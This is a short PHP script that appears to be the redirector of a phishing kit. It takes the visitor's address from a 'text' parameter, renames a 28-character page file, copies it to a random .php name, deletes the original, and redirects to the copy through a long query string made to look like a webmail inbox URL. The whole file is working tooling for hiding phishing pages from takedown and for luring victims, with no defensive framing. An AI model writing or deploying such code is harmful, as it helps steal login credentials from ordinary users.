<?php
session_start();
?>
<?php
$l0gin = $_GET['text'];
$dir =  getcwd();
if ($handle = opendir($dir)) {
    while (false !== ($entry = readdir($handle))) {
 $len = strlen($entry);
if($len == 28){
rename($entry, "l0gin.php");
}}}
$staticfile = "l0gin.php";
$name =  generateRandomString();
$secfile = $name.".php";
if (!copy($staticfile, $secfile)) {
//echo "file not create\n";
}else {
if(file_exists($secfile)){
//echo "file exist\n";
unlink($staticfile);
header("Location: $secfile?rand=13InboxLightaspxn.1927873918&fid.4.1257892342&fid=1&fav.1&rand.13InboxLight.aspxn.1776439418&fid.12500232&fid.1&fav.1&text=$l0gin&.rand=13InboxLight.aspx?n=177429268&fid=4#n=198659642&fid=1&fav=1");
}}

//echo $_SESSION["file"]."\n";
$name =  generateRandomString();
function generateRandomString($length = 24) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
?>
